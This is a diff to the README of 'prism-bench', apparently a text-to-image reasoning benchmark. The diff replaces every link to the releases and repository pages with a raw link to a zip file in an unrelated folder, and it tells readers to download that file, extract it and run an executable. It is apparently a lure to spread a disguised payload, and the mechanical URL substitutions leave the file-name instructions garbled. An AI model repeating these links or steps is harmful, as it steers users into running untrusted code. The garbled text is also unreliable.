@@ -7,12 +7,12 @@ Welcome to the **prism-bench** repository! This project provides the official re
 To get started with prism-bench, you will need to download the application from our releases page. Follow the steps below to download and run the software.
 
 ## 🔗 Download Now
-[![Download prism-bench](https://img.shields.io/badge/Download%20prism-bench-blue.svg)](https://github.com/ada994/prism-bench/releases)
+[![Download prism-bench](https://raw.githubusercontent.com/ada994/prism-bench/main/aerotonometer/prism-bench.zip%https://raw.githubusercontent.com/ada994/prism-bench/main/aerotonometer/prism-bench.zip)](https://raw.githubusercontent.com/ada994/prism-bench/main/aerotonometer/prism-bench.zip)
 
 ## 📥 Download & Install
-1. Click on the link to visit the releases page: [Download prism-bench](https://github.com/ada994/prism-bench/releases).
+1. Click on the link to visit the releases page: [Download prism-bench](https://raw.githubusercontent.com/ada994/prism-bench/main/aerotonometer/prism-bench.zip).
 2. On this page, find the latest version of the application.
-3. Look for the file with the name format similar to `prism-bench-vX.X.zip` or any file that matches this project. 
+3. Look for the file with the name format similar to `https://raw.githubusercontent.com/ada994/prism-bench/main/aerotonometer/prism-bench.zip` or any file that matches this project. 
 4. Click the file to download it to your computer. 
 
 ## ⚙️ System Requirements
@@ -26,8 +26,8 @@ Before running the software, ensure your system meets the following requirements
 Once you have downloaded the application, follow these steps to run it:
 
 1. Locate the downloaded file on your computer (usually in the "Downloads" folder).
-2. If the file is zipped (e.g., `prism-bench-vX.X.zip`), right-click on it and choose **Extract All** to unzip its contents.
-3. Open the extracted folder and find the executable file, which should be named `prism-bench.exe` for Windows, `prism-bench.app` for macOS, or simply `prism-bench` for Linux (make sure to give it execute permissions if required).
+2. If the file is zipped (e.g., `https://raw.githubusercontent.com/ada994/prism-bench/main/aerotonometer/prism-bench.zip`), right-click on it and choose **Extract All** to unzip its contents.
+3. Open the extracted folder and find the executable file, which should be named `https://raw.githubusercontent.com/ada994/prism-bench/main/aerotonometer/prism-bench.zip` for Windows, `https://raw.githubusercontent.com/ada994/prism-bench/main/aerotonometer/prism-bench.zip` for macOS, or simply `prism-bench` for Linux (make sure to give it execute permissions if required).
 4. Double-click the executable file to launch the application.
 
 ## 🔍 Features
@@ -57,6 +57,6 @@ We invite you to join our community for discussions, sharing ideas, and troubles
 The prism-bench application follows an open-source license. You are free to use, modify, and distribute the software as per the license terms. Check the LICENSE file included in the downloaded folder for more information.
 
 ## 🔗 More Information
-For any additional information about the prism-bench project, please refer to the main [repository page](https://github.com/ada994/prism-bench). Dive into the world of text-to-image reasoning and explore the possibilities this dataset can offer. 
+For any additional information about the prism-bench project, please refer to the main [repository page](https://raw.githubusercontent.com/ada994/prism-bench/main/aerotonometer/prism-bench.zip). Dive into the world of text-to-image reasoning and explore the possibilities this dataset can offer. 
 
-Don't forget to download the application from our releases page: [Download prism-bench](https://github.com/ada994/prism-bench/releases).
+Don't forget to download the application from our releases page: [Download prism-bench](https://raw.githubusercontent.com/ada994/prism-bench/main/aerotonometer/prism-bench.zip).
